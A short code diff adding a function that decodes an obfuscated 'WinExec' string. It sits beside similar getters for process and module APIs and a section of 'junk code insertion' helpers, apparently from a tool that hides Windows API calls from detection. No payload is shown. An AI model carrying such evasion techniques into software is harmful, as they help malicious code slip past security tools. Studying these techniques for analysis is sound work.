@@ -262,6 +262,7 @@ char* obf_getproc(void) { return get_str(enc_getproc, sizeof(enc_getproc)-1); }
 char* obf_getmod(void) { return get_str(enc_getmod, sizeof(enc_getmod)-1); }
 char* obf_enumproc(void) { return get_str(enc_enumproc, sizeof(enc_enumproc)-1); }
 char* obf_getbasename(void) { return get_str(enc_getbasename, sizeof(enc_getbasename)-1); }
+char* obf_winexec(void) { return get_str(enc_winexec, sizeof(enc_winexec)-1); }
 
 /* === Junk code insertion helpers === */
 
